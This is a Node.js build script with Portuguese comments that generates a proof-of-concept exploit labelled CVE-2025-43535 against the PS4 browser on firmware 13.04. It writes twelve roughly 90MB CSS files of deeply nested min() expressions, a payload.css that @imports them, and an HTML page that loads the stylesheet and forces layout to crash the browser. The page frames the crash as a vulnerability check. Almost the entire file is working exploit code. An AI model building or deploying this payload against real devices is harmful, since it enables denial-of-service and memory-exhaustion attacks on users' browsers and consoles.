// generate.js — roda no GitHub Actions, gera arquivos em dist/
// Não precisa rodar localmente. O GitHub executa automaticamente.

const { createWriteStream, mkdirSync, writeFileSync } = require('fs');
const { statSync } = require('fs');

// Criar pasta de saída
mkdirSync('dist', { recursive: true });

const NUM_FILES = 12; // 12 × 90MB = 1080MB > threshold 1021MB

// base = depth=16 = 576KB — único objeto grande na RAM
function buildBase() {
  let e = '1px';
  for (let i = 1; i <= 16; i++) {
    const n = 'min(' + e + ',' + e + ')';
    e = null; e = n;
  }
  return e;
}

const base = buildBase();
console.log('base: ' + (base.length / 1024).toFixed(0) + 'KB');

// Escreve um nó min() aninhado em streaming — nunca acumula RAM
function streamNode(writer, cur, target) {
  if (cur === target) { writer.write(base); return; }
  writer.write('min(');
  streamNode(writer, cur + 1, target);
  writer.write(',');
  streamNode(writer, cur + 1, target);
  writer.write(')');
}

// Gera dist/aN.css: ~90MB cada
// .tN { width: min(sym23=72MB, sym21=18MB) }
function generateFile(idx) {
  return new Promise((resolve) => {
    const filename = 'dist/a' + idx + '.css';
    process.stdout.write('Gerando ' + filename + '... ');
    const out = createWriteStream(filename);
    out.write('.t' + idx + '{width:min(');
    streamNode(out, 16, 23);  // 72MB
    out.write(',');
    streamNode(out, 16, 21);  // 18MB
    out.write(')}');
    out.end(() => {
      const mb = (statSync(filename).size / 1024 / 1024).toFixed(1);
      console.log(mb + 'MB OK');
      resolve();
    });
  });
}

// Gera dist/payload.css com @imports
function generatePayload() {
  let css = '';
  for (let i = 0; i < NUM_FILES; i++) {
    css += '@import url("a' + i + '.css");\n';
  }
  writeFileSync('dist/payload.css', css);
  console.log('dist/payload.css OK (' + NUM_FILES + ' @imports)');
}

// Gera dist/index.html
function generateIndex() {
  const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535</title>
<style>
body{background:#0a0a0a;color:#88ff88;font-family:monospace;padding:16px;margin:0;font-size:13px}
#log{background:#111;border:1px solid #2a4a2a;padding:10px;height:72vh;overflow-y:auto;font-size:11px;line-height:1.7}
.ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
.crash{color:#ff44ff;font-weight:bold}.dim{color:#336633}
.bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
</style>
</head>
<body>
<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
CVE-2025-43535 &middot; 12x90MB @import &middot; PS4 FW 13.04
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
<script>
"use strict";
var logEl=document.getElementById('log'),barEl=document.getElementById('bar'),stage=document.getElementById('stage');
function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
function bar(m){barEl.textContent=m;}
function run(){
  L('CVE-2025-43535 &middot; 12 arquivos de 90MB via @import','info');
  L('Total: 1080MB &gt; threshold 1021MB do PS4','info');
  L('Sem blob &middot; Sem SW &middot; URL CSS normal','ok');
  L('','');
  L('[1/3] Carregando payload.css...','warn');
  L('[1/3] SE O BROWSER FECHAR = CRASH = CVE PRESENTE','crash');
  bar('[1/3] Carregando 12x90MB...');
  var el=document.createElement('div');
  el.className='t0';
  el.style.cssText='position:absolute;visibility:hidden';
  stage.appendChild(el);
  var link=document.createElement('link');
  link.rel='stylesheet';
  link.href='payload.css';
  link.onload=function(){
    L('[1/3] Carregado','ok');
    bar('[2/3] Forcando layout...');
    L('[2/3] offsetWidth...','warn');
    setTimeout(function(){
      try{void el.offsetWidth;var w=window.getComputedStyle(el).getPropertyValue('width');L('[2/3] width="'+w+'"','ok');}
      catch(e){L('[2/3] '+e,'fail');}
      try{document.head.removeChild(link);}catch(e){}
      try{stage.removeChild(el);}catch(e){}
      L('','');
      L('CRASH = CVE-2025-43535 PRESENTE','crash');
      L('SEM CRASH = PATCHED','ok');
      bar('DONE');
    },100);
  };
  link.onerror=function(){L('Erro ao carregar payload.css','fail');bar('ERRO');};
  document.head.appendChild(link);
}
window.addEventListener('load',function(){setTimeout(run,200);});
</script>
</body>
</html>`;
  writeFileSync('dist/index.html', html);
  console.log('dist/index.html OK');
}

(async () => {
  console.log('=== CVE-2025-43535 — GitHub Actions Build ===\n');
  for (let i = 0; i < NUM_FILES; i++) {
    await generateFile(i);
  }
  generatePayload();
  generateIndex();
  console.log('\n=== Build concluido ===');
  console.log('Total: ' + NUM_FILES + ' x 90MB = ' + (NUM_FILES * 90) + 'MB');
})();
